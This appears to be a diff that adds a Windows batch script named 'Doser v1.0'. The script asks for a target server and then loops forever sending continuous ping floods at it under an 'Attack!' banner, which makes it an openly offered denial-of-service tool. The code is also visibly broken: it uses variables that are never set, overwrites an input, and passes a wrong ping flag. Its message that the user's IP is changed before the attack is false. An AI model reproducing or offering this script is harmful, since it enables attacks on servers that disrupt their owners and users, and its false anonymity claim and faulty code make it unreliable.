@@ -1,0 +1,41 @@
+@echo off
+mode 10
+title Doser v1.0
+color 0a
+cls
+echo.
+echo ===============================================
+echo 		This Doser Was made by D****
+echo ===============================================
+echo.
+set /p M=Server Target:
+echo.
+echo ===============================================
+ping %x%
+echo ===============================================
+@ping.exe 127.0.0.1 -n 5 -m 1000 >ml
+goto Next
+:Next
+echo.
+echo.
+set /p m=Ip Adress (Ip Host):
+echo.
+set /p n=packet Size:
+echo.
+set /p n=Message To server Owner:
+echo %ip% Your ip is changed before the attack is started
+echo.
+echo Is this the Ip Adress you want to be attacking
+echo Attacking Server %m%
+ping %m% -i %n% -t >nul
+echo Click Enter To proceed
+set /p input=
+color 02
+echo =======================
+echo 		Attack!
+echo =======================
+echo.
+:DDOS
+echo Attacking Server %m%
+ping %m% -i %m% -t >nul
+goto DDOS
